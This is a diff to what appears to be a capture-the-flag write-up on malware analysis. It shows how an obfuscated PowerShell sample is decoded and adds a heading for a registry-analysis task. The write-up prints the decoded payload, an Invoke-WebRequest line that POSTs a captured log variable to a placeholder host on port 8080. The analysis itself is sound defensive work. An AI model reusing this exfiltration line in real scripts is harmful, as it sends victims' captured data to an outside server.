@@ -91,3 +91,9 @@ Write-Output([System.Text.Encoding]::UTF8.GetString($dec))
 ```
 
 We can then execute this PowerShell file to output the expression being invoked by iex(). Running `pwsh sam1.ps1`  will show us the *actual* payload, and we will see `Invoke-WebRequest -uri http://vrqgb.invalid:8080 -Method Post -Body $global:log`, at the very bottom, which is our POST request being made to `vrqgb.invalid`. I saved this PowerShell script as `malicious.ps1` for future-use in later tasks.
+
+## Task 4: PowerShell, Registry Analysis
+A number of OOPS employees fell victim to the same attack, and we need to figure out what's been compromised! Examine the malware more closely to understand what it's doing. Then, use these artifacts to determine which account on the OOPS network has been compromised. 
+
+Files:
+* `artifacts.zip`
